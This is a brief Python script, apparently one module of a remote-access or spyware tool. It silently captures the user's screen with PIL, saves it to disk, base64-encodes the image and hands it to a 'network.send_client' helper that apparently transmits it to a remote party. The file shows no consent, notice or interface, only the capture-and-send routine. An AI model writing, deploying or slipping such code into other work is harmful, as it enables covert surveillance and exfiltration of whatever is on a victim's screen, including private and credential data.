import network
import base64
from PIL import ImageGrab


def grab_screen():
    image = ImageGrab.grab()
    image.save("screen.jpg")


def img_to_base64():
    image = open("screen.jpg", "rb")
    content = base64.b64encode(image.read())
    return content


def main():
    grab_screen()
    content = img_to_base64()
    network.send_client(content)


if __name__ == "__main__":
    main()
